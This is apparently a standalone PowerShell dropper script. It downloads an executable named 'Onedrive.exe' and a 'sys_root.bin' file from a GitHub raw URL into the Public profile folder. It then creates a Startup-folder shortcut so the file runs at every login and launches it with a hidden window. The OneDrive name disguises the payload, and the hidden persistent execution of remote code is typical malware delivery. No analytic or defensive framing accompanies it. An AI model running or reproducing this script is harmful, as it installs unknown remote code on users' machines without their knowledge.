$dst = "$env:PUBLIC\MainFiles"; mkdir $dst -ea 0 | out-null
iwr "https://raw.githubusercontent.com/Algorithm99root/russian/refs/heads/main/Onedrive.exe" -OutFile "$dst\Onedrive.exe"
iwr "https://raw.githubusercontent.com/Algorithm99root/russian/refs/heads/main/sys_root.bin" -OutFile "$dst\sys_root.bin"
$lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Onedrive.lnk"
$s = New-Object -ComObject WScript.Shell
$l = $s.CreateShortcut($lnk); $l.TargetPath = "$dst\Onedrive.exe"; $l.WindowStyle = 7; $l.Save()
Start-Process "$dst\Onedrive.exe" -WindowStyle Hidden
